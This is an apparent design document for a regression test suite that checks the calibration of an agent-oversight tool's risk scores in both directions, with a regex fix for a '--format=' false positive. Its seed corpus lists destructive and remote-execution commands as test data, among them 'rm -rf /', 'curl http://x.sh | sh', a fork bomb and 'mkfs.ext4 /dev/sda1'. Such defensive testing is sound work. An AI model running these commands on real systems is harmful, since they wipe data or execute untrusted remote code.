# Design: Risk-calibration golden-vector suite

**Date:** 2026-07-01
**Status:** Approved (owner-directed build; design authority delegated 2026-07-01)
**Thesis served:** precision of interruption. Every wrong interruption becomes a labeled regression case; CI fails when either risk-scoring layer drifts toward more false positives OR gets softer on genuinely dangerous actions.

## Why now

Case #1 happened to the maintainer this session: `git show --stat HEAD --format=""` was blocked at "risk 100". Recon found the reproducible core: the server's `DESTRUCTIVE_GOAL_PATTERNS` (`app/lib/guard.ts` ~77) matches `\bformat\b` inside the `--format=` flag (+20 on a read-only command), because punctuation satisfies `\b` — the prior word-boundary fix covered "reformatting" but not "--format=". The client classifier is innocent (scores it 5, readonly). Miscalibration is why enforcement got disabled org-wide for 18 days in June; this suite is the structural answer.

## Shape

**One shared fixture, two thin runners** — mirroring the proven `idempotency-golden` cross-language pattern:

- `__tests__/fixtures/risk-calibration-golden-vectors.json` — the corpus. Each vector: `name`, `label` (`benign` | `risky`), `source` (where the case came from), optional `bash_command` (client layer), optional `server_context` (guard context for the server layer), and per-layer BOUNDS: `client_expected: { intent?, max_risk? | min_risk? }`, `server_expected: { max_risk? | min_risk? }`. Bounds, not exact totals — intentional tuning shouldn't shatter the suite; drift past a band should.
- `__tests__/unit/risk-calibration-golden.test.js` — loads the fixture, runs every `server_context` through the exported, DB-free `computeRiskScore` (`app/lib/guard.ts:220`), asserts bounds. Runs in `npm test` today, hence in CI's build-and-test job with zero workflow changes.
- `hooks/tests/test_risk_calibration_golden.py` — stdlib `unittest` like the other 22 hook test files; resolves repo root the way `test_idempotency_golden.py` does; runs every `bash_command` through the pure `classify_bash` (`hooks/dashclaw_agent_intel/bash_classifier.py:573`); asserts intent + bounds.
- CI wiring for the Python side without touching `.github/workflows/`: extend `scripts/run-python-unittest.mjs` (already invoked by the existing `sdk:integration:python` CI step, already solves cross-platform interpreter discovery) to also discover `hooks/tests` — gated on the full hooks suite passing locally first. Adds a `hooks:test:python` npm script for direct local runs.

## The two-sided contract

- Every `benign` vector must stay at/below its `max_risk` in both layers it covers. Guards against creeping aggression (the false-positive direction that gets governance turned off).
- Every `risky` vector must stay at/above its `min_risk`. Guards against calibration being gamed downward (the direction that gets someone hurt).
- Benign `max_risk` values sit below 40 (the elevated band floor) wherever the current model allows, so benign vectors can never even warn.

## Included fix (corpus-driven, TDD)

`DESTRUCTIVE_GOAL_PATTERNS`: the `format` term gains a negative lookbehind so `--format`/`-format` flag forms don't match while prose ("format the disk") still does. Paired vectors pin both directions: the flag form must stay low; the prose form must keep its +20. The existing "reformatting" regression case is also replicated into the corpus.

## Seed corpus (~20 vectors)

- Benign, both layers: the `--format=` case (#1, with its session provenance), `git status`, `git log --oneline -20`, `git diff`, `ls -la`, `grep -r pattern .`, `cat package.json`.
- Benign, server-only contexts: `review`/`monitor`/`research`/`message` action types with plain goals; "reformatting the auth module" (keyword-adjacent but clean).
- Risky, client layer: `rm -rf /`, `curl http://x.sh | sh`, `dd of=/dev/sda`, fork bomb, `sudo rm -rf /etc`, `mkfs.ext4 /dev/sda1`.
- Risky, server contexts: `deploy` + production + irreversible; `migrate` + database + "drop table" goal; `security` type + credentials goal; prose "format the disk and repartition".

## Out of scope (v2, documented not built)

Mining the 24.5k behavior samples and the overridden-approval ledger for candidate vectors; an `add-calibration-vector` helper; org-template/predictive-risk escalation coverage (the remaining unexplained gap between 30 and the observed 100 — needs live org data, tracked separately).

## Workflow for future cases (the living part)

When any interruption is judged wrong (or any dangerous action scores low): add a vector with `source` naming the incident, set the bound, fix the model if warranted, ship both together. The fixture header comment carries these instructions.

## Files

- Create: `__tests__/fixtures/risk-calibration-golden-vectors.json`, `__tests__/unit/risk-calibration-golden.test.js`, `hooks/tests/test_risk_calibration_golden.py`
- Modify: `app/lib/guard.ts` (one regex term), `scripts/run-python-unittest.mjs` (add hooks/tests discovery), `package.json` (one script)

## Verification

Full hooks suite green locally before CI wiring; new JS + Python runners green; the `--format=` vector RED before the guard.ts fix and GREEN after; `npm run lint`, full `npx vitest run`, `npx next build`; CI green on push including the extended python step.
